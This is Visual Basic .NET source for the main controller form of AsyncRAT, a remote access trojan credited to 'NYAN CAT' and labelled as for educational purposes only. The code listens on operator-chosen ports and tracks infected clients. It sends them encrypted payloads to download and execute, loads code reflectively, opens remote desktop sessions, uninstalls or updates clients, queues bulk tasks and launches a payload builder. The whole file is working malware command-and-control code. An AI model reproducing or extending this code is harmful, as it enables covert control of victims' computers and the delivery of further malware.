Imports System.ComponentModel
Imports System.IO


'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT // Simple Socket

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

'

Public Class Form1
    Public S As Server

    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Await Task.Delay(250)

        Messages.F = Me

        Pending.Req_In = New List(Of Incoming_Requests)
        Dim Req_In As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.Incoming))
        Req_In.IsBackground = False
        Req_In.Start()

        Pending.Req_Out = New List(Of Outcoming_Requests)
        Dim Req_Out As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.OutComing))
        Req_Out.IsBackground = False
        Req_Out.Start()

        Try
            Dim PORTS As New Intro
            PORTS.ShowDialog()
            If PORTS.OK = True Then
                Dim A As String() = Split(PORTS.TextBox1.Text.Trim, ",")
                For i As Integer = 0 To A.Length - 1
                    If Not String.IsNullOrWhiteSpace(A(i)) Then
                        Settings.Ports.Add(A(i).Trim)
                        S = New Server
                        Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
                        listener.Start(A(i).Trim)
                    End If
                Next
                Settings.KEY = PORTS.TextBox2.Text
                PORTS.Close()
                STV("PORTS", String.Join(",", Settings.Ports.ToList))
                STV("KEY", Settings.KEY)
            Else
                Environment.Exit(0)
            End If

            Try : LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize) : Catch : End Try
        Catch ex As Exception
            Debug.WriteLine("PORTS INTRO " + ex.Message)
        End Try
    End Sub

    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Try
            Application.Exit()
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try
                For Each C As ListViewItem In LV1.SelectedItems
                    Dim CL As Client = CType(C.Tag, Client)
                    Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientShutdown))
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("CLOSEToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "Update Client"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim CL As Client = CType(C.Tag, Client)
                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientUpdate), Path.GetExtension(o.FileName), AES_Encryptor(File.ReadAllBytes(o.FileName)), True)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                Debug.WriteLine("UPDATEToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub UNINSTALLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UNINSTALLToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.ClientDelete))
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("CLOSEToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub DROPANDEXECUTEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DROPANDEXECUTEToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.*)|*.*"
                    .Title = "Download and Execute"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim CL As Client = CType(C.Tag, Client)
                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientUpdate), Path.GetExtension(o.FileName), AES_Encryptor(File.ReadAllBytes(o.FileName)), False)
                        Pending.Req_Out.Add(ClientReq)
                        CL.LV.ForeColor = Color.Red
                    Next
                End If
            Catch ex As Exception
                Debug.WriteLine("DownloadAndExecuteToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub LOADERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LOADERToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try
                Dim LDR As New Loader
                LDR.ShowDialog()
                If LDR.isOK Then

                    For Each C As ListViewItem In LV1.SelectedItems
                        Dim CL As Client = CType(C.Tag, Client)
                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.Reflection), AES_Encryptor(File.ReadAllBytes(LDR.o.FileName)))
                        Pending.Req_Out.Add(ClientReq)
                        CL.LV.ForeColor = Color.Red
                    Next
                End If
            Catch ex As Exception
                Debug.WriteLine("LOADERToolStripMenuItem_Click " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If LV1.SelectedItems.Count > 0 Then
            Try

                For Each C As ListViewItem In LV1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.RemoteDesktopOpen))
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("RemoteDesktopToolStripMenuItem " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try
            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList), Settings.KEY)
            Text = Settings.VER + "  " + DateTime.Now
        Catch ex As Exception
            Debug.WriteLine("Timer_Status " + ex.Message)
        End Try
    End Sub

    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If LV1.Items.Count > 0 Then
            Try

                For Each C As ListViewItem In LV1.Items
                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.Ping))
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                Debug.WriteLine("Timer_Ping " + ex.Message)
            End Try
        End If
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MessageBox.Show("
       │ Author       : NYAN CAT

       │ Name         : AsyncRAT

       │ Contact Me   : https://github.com/NYAN-x-CAT

       │ This program is distributed for educational purposes only.

       │ Feel free to modify this software, but a credit and a link back to my GitHub is needed
")
    End Sub

    Private Sub LV1_MouseMove(sender As Object, e As MouseEventArgs) Handles LV1.MouseMove
        Try
            Dim hitInfo = LV1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then LV1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
            Debug.WriteLine("LV1_MouseMove " + ex.Message)
        End Try
    End Sub

    Private Sub LV1_KeyDown(sender As Object, e As KeyEventArgs) Handles LV1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If LV1.Items.Count > 0 Then
                    For Each x As ListViewItem In LV1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AddTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddTaskToolStripMenuItem.Click
        Try
            Dim T As New TaskForm
            T.ShowDialog()
            Dim _TaskID As String = Guid.NewGuid.ToString
            If T.OK = True Then

                Dim LV = LV3.Items.Insert(0, LV3.Items.Count + 1)
                LV.SubItems.Add(T._CMD + " = " + Path.GetFileName(T._FILE))
                LV.SubItems.Add(0)
                LV.Tag = _TaskID
                LV3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                If T._CMD = "UPDATE" Then
                    Dim ClientReq As New WorkTask(CByte(PacketHeader.ClientUpdate), AES_Encryptor(File.ReadAllBytes(T._FILE)), True) With {
                        .F = Me,
                        .TaskID = _TaskID
                    }
                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ClientReq.Work))

                ElseIf T._CMD = "DW" Then
                    Dim ClientReq As New WorkTask(CByte(PacketHeader.ClientUpdate), Path.GetExtension(T._FILE), AES_Encryptor(File.ReadAllBytes(T._FILE)), False) With {
                            .F = Me,
                            .TaskID = _TaskID}
                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ClientReq.Work))

                End If
                T.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine("AddTaskToolStripMenuItem_Click " + ex.Message)
        End Try
    End Sub

    Private Sub RemoveTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveTaskToolStripMenuItem.Click
        Try
            If LV3.Items.Count > 0 Then
                For Each x As ListViewItem In LV3.SelectedItems
                    x.Remove()
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BUILDERToolStripMenuItem.Click
        Builder.ShowDialog()
    End Sub


End Class
